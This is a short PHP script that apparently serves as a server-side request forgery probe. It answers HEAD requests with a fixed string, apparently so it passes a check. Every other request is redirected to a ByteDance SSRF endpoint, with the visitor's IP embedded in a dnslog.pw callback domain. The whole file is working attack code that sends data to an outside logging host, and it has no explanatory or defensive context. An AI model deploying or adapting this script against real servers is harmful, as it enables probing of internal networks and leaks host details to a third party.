<?php
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['REMOTE_ADDR'];
$requestMethod = $_SERVER['REQUEST_METHOD'];

if ($requestMethod === "HEAD") {
    echo "123123";
    exit();
} else {
    header("Location: https://src-ssrf.bytedance.net/ssrf?host=$ip.www9527.dnslog.pw");
    exit(); // 确保在重定向后立即终止脚本的执行
}
?>
